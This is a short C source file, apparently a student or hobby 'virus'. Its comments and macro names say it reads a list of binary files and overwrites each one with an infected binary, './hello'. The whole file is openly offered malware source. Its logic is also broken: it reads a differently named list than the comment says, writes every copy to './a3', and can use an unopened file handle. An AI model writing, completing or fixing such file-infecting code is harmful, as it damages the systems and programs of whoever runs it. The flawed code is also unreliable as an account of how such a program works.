#include <ftw.h>
#include <stdio.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


#define viruscode "./hello"
#define sourcetoinjectcode "./virus" 

static FILE* F;

// takes binary files from binaryFileList.txt one by one
// overrides them with infected binary file named ./hello
int Virus();

int main(int argc, char *argv[]) 
{
	Virus();
	return 0;
}

int Virus()
{
	int i =0;
	size_t l1;
	size_t l2;
	char line1[1000];
	char line2[1000];
	unsigned char buffer[8192];
	

	FILE *nfile;
	FILE *vfile;
	
	F = fopen("./binaryfile.txt", "r");
	

	while(fgets(line2,1000,F)!= NULL)
	{
		line2[strcspn(line2,"\n")] = 0;
		if(strncmp(line2,sourcetoinjectcode,strlen(line2)) != 0){
			if(strncmp(line2,viruscode,strlen(line2)) != 0){
				nfile = fopen("./a3","wb");
				if(nfile == NULL){
				}
			}
		}
		vfile = fopen(viruscode,"rb");
		while((l1 = fread(buffer, 1, sizeof buffer, vfile)) > 0) 
		{
			l2 = fwrite(buffer, 1, l1, nfile);
		  	if(l2 < l1){
	    		if(ferror(nfile))
			{
		    		printf("%s\n","error" );
		    	}
		    else
			{
		    		printf("l2 > l1"); 
		    	}
		    		  }	
		    i++;
		}
		fclose(nfile);
		fclose(vfile);
		
	}
	return 0;
}
